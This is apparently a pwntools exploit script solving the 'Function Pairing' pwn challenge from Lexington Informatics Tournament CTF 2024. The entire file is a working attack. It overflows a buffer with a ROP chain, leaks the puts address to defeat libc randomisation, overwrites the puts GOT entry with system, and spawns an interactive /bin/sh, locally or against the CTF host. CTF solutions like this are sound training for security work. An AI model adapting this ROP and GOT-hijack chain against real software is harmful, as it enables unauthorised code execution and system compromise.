#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/Lexington Informatics Tournament CTF 2024/pwn/Function Pairing/vuln')
elf = ELF(TARGET)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    rop.raw(cyclic(0x108))
    rop.call(elf.sym.gets, [elf.bss() + 0x800])
    rop.call(elf.sym.puts, [elf.got['puts']])
    rop.call(elf.sym.gets, [elf.got['puts']])
    rop.call(elf.sym.puts, [elf.bss() + 0x800])

    r.sendlineafter(b'gets/puts\n', rop.chain())
    r.sendlineafter(b'fgets/fputs\n',b'A')
    r.recvline()

    r.sendline(b'/bin/sh')

    puts = u64(r.recvline().strip().ljust(8, b'\x00'))
    libc.address = puts - libc.sym.puts

    r.sendline(p64(libc.sym.system))
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('litctf.org', 31774)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
